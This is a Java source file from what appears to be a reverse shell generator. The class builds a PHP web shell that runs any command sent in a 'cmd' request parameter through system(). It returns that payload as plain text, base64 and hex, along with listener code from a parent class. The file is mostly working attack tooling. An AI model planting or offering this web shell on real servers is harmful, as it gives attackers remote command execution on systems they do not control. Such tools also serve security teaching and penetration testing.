package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;

public class Php_cmd2 extends Reverse {

    protected String shellFormat = "";

    public Php_cmd2(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("<?php if(isset($_REQUEST[\\'cmd\\'])){ echo \\\"<pre>\\\"; $cmd = ($_REQUEST[\\'cmd\\']); system($cmd); echo \\\"<\\/pre>\\\"; die; }?>");
    }

    @Override
    public String getShellCode(){
        return shellFormat;
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + "," +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                "}";
    }
    
} 